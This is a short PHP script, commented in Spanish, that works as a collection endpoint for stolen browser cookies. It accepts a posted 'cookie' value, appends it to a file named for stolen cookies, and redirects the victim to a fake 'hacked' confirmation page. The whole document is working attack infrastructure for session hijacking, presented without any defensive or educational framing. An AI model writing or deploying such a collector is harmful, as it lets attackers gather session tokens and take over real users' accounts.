<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cookie'])) {
    $cookie = $_POST['cookie'];
    $archivo = __DIR__ . '/cookies_robadas_post.txt';
    
    // Guardar la cookie en el archivo
    file_put_contents($archivo, $cookie . PHP_EOL, FILE_APPEND);
    
    // Redirigir a una página de confirmación falsa
    header("Location: hackeado.php");
    exit();
} else {
    die("Acceso no autorizado.");
}
?>